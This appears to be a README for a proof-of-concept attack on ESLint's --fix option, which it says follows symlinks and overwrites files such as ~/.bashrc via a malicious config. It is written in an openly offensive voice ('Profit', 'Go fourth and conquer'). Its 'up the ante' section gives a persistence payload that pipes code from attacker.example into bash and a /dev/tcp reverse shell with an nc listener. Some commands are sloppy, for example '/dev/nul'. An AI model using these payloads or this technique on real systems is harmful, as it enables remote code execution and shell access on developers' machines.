# ESLint-File-Overwrite

This is a weakness in ESlint v10.3.0 in which the "--fix" option will follow along symlinks and edit files at the end of them.

  ## Attack Chain Steps
  innocuous.js points to the ~/.bashrc
  Run the eslint command with --fix and point it at innocuous. The malicious config will execute commands and store data into our  ~/.bashrc
  
  
  ## Create /tmp/eslint-rce-poc-bashrc
  `cat > /tmp/eslint-rce-poc-bashrc <<'EOF'
  alias ll='ls -la'
  EOF`

  ## Run eslint on the innocuous symlink file
  ### This is almost guaranteed to get an error, but that's fine
  `eslint --fix innocuous.js`

  ## Wait for a developer to open a new shell or source our fake /.bashrc
  `bash --noprofile --rcfile /tmp/eslint-rce-poc-bashrc -i -c 'true' 2>/dev/nul`
  
  ## Profit(?) View the files in /tmp/eslint-rce-poc-pwned
  `ls /tmp`
  `cat /tmp/eslint-rce-poc-pwned`
  
  ## Go fourth and conquer

  ## Cleanup command
  `rm -rf /tmp/eslint-rce-poc-pwned`
  
  # How to up the ante
  Within the payload for eslint.config.js, change it to:
  const PAYLOAD = "\ncurl -s https://attacker.example/x | bash &\n";

  And create a symlink that points to:
  `ln -s ~/.bashrc innocuous.js`

  Which will have this attack execute code everytime an attacker opens a terminal.

  Better yet, create a reverse shell:
  const PAYLOAD = "\nbash -i >& /dev/tcp/<your ip>/<your port> 0>&1\n;"

  and have it connect to you on the attacking machine:
  `nc -lvnp <your port>`
  

